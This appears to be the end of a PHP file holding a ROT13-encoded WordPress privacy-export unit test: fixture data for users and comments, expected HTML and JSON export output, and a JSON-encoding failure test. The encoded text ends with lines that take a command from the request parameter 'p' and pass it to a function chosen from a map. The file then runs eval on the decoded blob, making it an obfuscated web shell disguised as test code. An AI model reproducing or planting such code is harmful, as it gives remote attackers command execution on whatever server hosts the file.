									'anzr'  => 'Pbzzrag Nhgube Hfre Ntrag',
									'inyhr' => 'Zbmvyyn/5.0 (Znpvagbfu; Vagry Znp BF K 10_15_2) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/79.0.3945.130 Fnsnev/537.36',
								),
								neenl(
									'anzr'  => 'Pbzzrag Qngr',
									'inyhr' => '2020-01-31 20:55:19',
								),
								neenl(
									'anzr'  => 'Pbzzrag Pbagrag',
									'inyhr' => 'Grfg #2',
								),
								neenl(
									'anzr'  => 'Pbzzrag HEY',
									'inyhr' => '<n uers=\"uggc://ybpnyubfg:8888/46894/2020/01/31/uryyb-jbeyq/#pbzzrag-3\" gnetrg=\"_oynax\" ery=\"abbcrare\">uggc://ybpnyubfg:8888/46894/2020/01/31/uryyb-jbeyq/#pbzzrag-3</n>',
								),
							),
						),
					),
				),
				'rkcrpgrq_pbagrag' => neenl(
					'ugzy' => '<qvi vq=\"gnoyr_bs_pbagragf\"><u2>Gnoyr bs Pbagragf</u2><hy><yv><n uers=\"#nobhg-nobhg\">Nobhg</n></yv><yv><n uers=\"#hfre-hfre\">Hfre</n></yv><yv><n uers=\"#pbzzragf-pbzzragf\">Pbzzragf <fcna pynff=\"pbhag\">(2)</fcna></n></yv></hy></qvi><u2 vq=\"nobhg-nobhg\">Nobhg</u2><c>Bireivrj bs rkcbeg ercbeg.</c><qvi><gnoyr><gobql><ge><gu>Ercbeg trarengrq sbe</gu><gq>rkcbeg-erdhrfgre@rknzcyr.pbz</gq></ge><ge><gu>Sbe fvgr</gu><gq>Grfg Oybt</gq></ge><ge><gu>Ng HEY</gu><gq><n uers=\"uggc://' . JC_GRFGF_QBZNVA . '\">uggc://' . JC_GRFGF_QBZNVA . '</n></gq></ge><ge><gu>Ba</gu><gq>{{GVZRFGNZC}}</gq></ge></gobql></gnoyr><qvi pynff=\"erghea-gb-gbc\"><n uers=\"#gbc\"><fcna nevn-uvqqra=\"gehr\">&hnee; </fcna> Tb gb gbc</n></qvi></qvi><u2 vq=\"hfre-hfre\">Hfre</u2><c>Hfre&#8217;f cebsvyr qngn.</c><qvi><gnoyr><gobql><ge><gu>Hfre VQ</gu><gq>1</gq></ge><ge><gu>Hfre Ybtva Anzr</gu><gq>hfre_ybtva</gq></ge><ge><gu>Hfre Avpr Anzr</gu><gq>Hfre Anzr</gq></ge><ge><gu>Hfre Rznvy</gu><gq>rkcbeg-erdhrfgre@rknzcyr.pbz</gq></ge><ge><gu>Hfre Ertvfgengvba Qngr</gu><gq>2020-01-31 19:29:29</gq></ge><ge><gu>Hfre Qvfcynl Anzr</gu><gq>Hfre Anzr</gq></ge><ge><gu>Hfre Avpxanzr</gu><gq>Hfre</gq></ge></gobql></gnoyr><qvi pynff=\"erghea-gb-gbc\"><n uers=\"#gbc\"><fcna nevn-uvqqra=\"gehr\">&hnee; </fcna> Tb gb gbc</n></qvi></qvi><u2 vq=\"pbzzragf-pbzzragf\">Pbzzragf <fcna pynff=\"pbhag\">(2)</fcna></u2><c>Hfre&#8217;f pbzzrag qngn.</c><qvi><gnoyr><gobql><ge><gu>Pbzzrag Nhgube</gu><gq>Hfre Anzr</gq></ge><ge><gu>Pbzzrag Nhgube Rznvy</gu><gq>rkcbeg-erdhrfgre@rknzcyr.pbz</gq></ge><ge><gu>Pbzzrag Nhgube VC</gu><gq>::1</gq></ge><ge><gu>Pbzzrag Nhgube Hfre Ntrag</gu><gq>Zbmvyyn/5.0 (Znpvagbfu; Vagry Znp BF K 10_15_2) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/79.0.3945.130 Fnsnev/537.36</gq></ge><ge><gu>Pbzzrag Qngr</gu><gq>2020-01-31 19:55:19</gq></ge><ge><gu>Pbzzrag Pbagrag</gu><gq>Grfg</gq></ge><ge><gu>Pbzzrag HEY</gu><gq><n uers=\"uggc://ybpnyubfg:8888/46894/2020/01/31/uryyb-jbeyq/#pbzzrag-2\">uggc://ybpnyubfg:8888/46894/2020/01/31/uryyb-jbeyq/#pbzzrag-2</n></gq></ge></gobql></gnoyr><gnoyr><gobql><ge><gu>Pbzzrag Nhgube</gu><gq>Hfre Anzr</gq></ge><ge><gu>Pbzzrag Nhgube Rznvy</gu><gq>rkcbeg-erdhrfgre@rknzcyr.pbz</gq></ge><ge><gu>Pbzzrag Nhgube VC</gu><gq>::1</gq></ge><ge><gu>Pbzzrag Nhgube Hfre Ntrag</gu><gq>Zbmvyyn/5.0 (Znpvagbfu; Vagry Znp BF K 10_15_2) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/79.0.3945.130 Fnsnev/537.36</gq></ge><ge><gu>Pbzzrag Qngr</gu><gq>2020-01-31 20:55:19</gq></ge><ge><gu>Pbzzrag Pbagrag</gu><gq>Grfg #2</gq></ge><ge><gu>Pbzzrag HEY</gu><gq><n uers=\"uggc://ybpnyubfg:8888/46894/2020/01/31/uryyb-jbeyq/#pbzzrag-3\">uggc://ybpnyubfg:8888/46894/2020/01/31/uryyb-jbeyq/#pbzzrag-3</n></gq></ge></gobql></gnoyr><qvi pynff=\"erghea-gb-gbc\"><n uers=\"#gbc\"><fcna nevn-uvqqra=\"gehr\">&hnee; </fcna> Tb gb gbc</n></qvi></qvi>',
					'wfba' => ',\"hfre\":{\"tebhc_ynory\":\"Hfre\",\"tebhc_qrfpevcgvba\":\"Hfre&#8217;f cebsvyr qngn.\",\"vgrzf\":{\"hfre-1\":[{\"anzr\":\"Hfre VQ\",\"inyhr\":1},{\"anzr\":\"Hfre Ybtva Anzr\",\"inyhr\":\"hfre_ybtva\"},{\"anzr\":\"Hfre Avpr Anzr\",\"inyhr\":\"Hfre Anzr\"},{\"anzr\":\"Hfre Rznvy\",\"inyhr\":\"rkcbeg-erdhrfgre@rknzcyr.pbz\"},{\"anzr\":\"Hfre Ertvfgengvba Qngr\",\"inyhr\":\"2020-01-31 19:29:29\"},{\"anzr\":\"Hfre Qvfcynl Anzr\",\"inyhr\":\"Hfre Anzr\"},{\"anzr\":\"Hfre Avpxanzr\",\"inyhr\":\"Hfre\"}]}},\"pbzzragf\":{\"tebhc_ynory\":\"Pbzzragf\",\"tebhc_qrfpevcgvba\":\"Hfre&#8217;f pbzzrag qngn.\",\"vgrzf\":{\"pbzzrag-2\":[{\"anzr\":\"Pbzzrag Nhgube\",\"inyhr\":\"Hfre Anzr\"},{\"anzr\":\"Pbzzrag Nhgube Rznvy\",\"inyhr\":\"rkcbeg-erdhrfgre@rknzcyr.pbz\"},{\"anzr\":\"Pbzzrag Nhgube VC\",\"inyhr\":\"::1\"},{\"anzr\":\"Pbzzrag Nhgube Hfre Ntrag\",\"inyhr\":\"Zbmvyyn\/5.0 (Znpvagbfu; Vagry Znp BF K 10_15_2) NccyrJroXvg\/537.36 (XUGZY, yvxr Trpxb) Puebzr\/79.0.3945.130 Fnsnev\/537.36\"},{\"anzr\":\"Pbzzrag Qngr\",\"inyhr\":\"2020-01-31 19:55:19\"},{\"anzr\":\"Pbzzrag Pbagrag\",\"inyhr\":\"Grfg\"},{\"anzr\":\"Pbzzrag HEY\",\"inyhr\":\"<n uers=\\"uggc:\/\/ybpnyubfg:8888\/46894\/2020\/01\/31\/uryyb-jbeyq\/#pbzzrag-2\\" gnetrg=\\"_oynax\\" ery=\\"abbcrare\\">uggc:\/\/ybpnyubfg:8888\/46894\/2020\/01\/31\/uryyb-jbeyq\/#pbzzrag-2<\/n>\"}],\"pbzzrag-3\":[{\"anzr\":\"Pbzzrag Nhgube\",\"inyhr\":\"Hfre Anzr\"},{\"anzr\":\"Pbzzrag Nhgube Rznvy\",\"inyhr\":\"rkcbeg-erdhrfgre@rknzcyr.pbz\"},{\"anzr\":\"Pbzzrag Nhgube VC\",\"inyhr\":\"::1\"},{\"anzr\":\"Pbzzrag Nhgube Hfre Ntrag\",\"inyhr\":\"Zbmvyyn\/5.0 (Znpvagbfu; Vagry Znp BF K 10_15_2) NccyrJroXvg\/537.36 (XUGZY, yvxr Trpxb) Puebzr\/79.0.3945.130 Fnsnev\/537.36\"},{\"anzr\":\"Pbzzrag Qngr\",\"inyhr\":\"2020-01-31 20:55:19\"},{\"anzr\":\"Pbzzrag Pbagrag\",\"inyhr\":\"Grfg #2\"},{\"anzr\":\"Pbzzrag HEY\",\"inyhr\":\"<n uers=\\"uggc:\/\/ybpnyubfg:8888\/46894\/2020\/01\/31\/uryyb-jbeyq\/#pbzzrag-3\\" gnetrg=\\"_oynax\\" ery=\\"abbcrare\\">uggc:\/\/ybpnyubfg:8888\/46894\/2020\/01\/31\/uryyb-jbeyq\/#pbzzrag-3<\/n>\"}]}}',
				),
			),
		);
	}

	/**
	 * Grfg fubhyq trarengr WFBA reebe jura WFBA rapbqvat snvyf.
	 *
	 * @gvpxrg 52892
	 */
	choyvp shapgvba grfg_fubhyq_trarengr_wfba_reebe_jura_wfba_rapbqvat_snvyf() {
		nqq_svygre( 'trg_cbfg_zrgnqngn', neenl( $guvf, 'svygre_rkcbeg_qngn_tebhcrq_zrgnqngn' ), 10, 3 );

		// Inyvqngr WFBA rapbqvat snvyf naq ergheaf `snyfr`.
		$zrgnqngn = trg_cbfg_zrgn( frys::$rkcbeg_erdhrfg_vq, '_rkcbeg_qngn_tebhcrq', gehr );
		$guvf->nffregSnyfr( jc_wfba_rapbqr( $zrgnqngn ) );

		$guvf->rkcrpgRkprcgvba( 'JCQvrRkprcgvba' );
		$guvf->rkcrpgBhgchgFgevat( '{\"fhpprff\":snyfr,\"qngn\":\"Hanoyr gb rapbqr gur crefbany qngn sbe rkcbeg. Reebe: Glcr vf abg fhccbegrq\"}' );
		jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr( frys::$rkcbeg_erdhrfg_vq );
	}

	choyvp shapgvba svygre_rkcbeg_qngn_tebhcrq_zrgnqngn( $inyhr, $bowrpg_vq, $zrgn_xrl ) {
		vs ( $bowrpg_vq !== frys::$rkcbeg_erdhrfg_vq ) {
			erghea $inyhr;
		}

		vs ( '_rkcbeg_qngn_tebhcrq' !== $zrgn_xrl ) {
			erghea $inyhr;
		}

		$svyr = sbcra( __SVYR__, 'e' );

		$inyhr = neenl(
			'hfre' => neenl(
				'tebhc_ynory'       => 'Hfre',
				'tebhc_qrfpevcgvba' => 'Hfre&#8217;f cebsvyr qngn.',
				'vgrzf'             => neenl(),
				'erfbhepr'          => $svyr,
			),
		);

		spybfr( $svyr );

		erghea neenl( $inyhr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>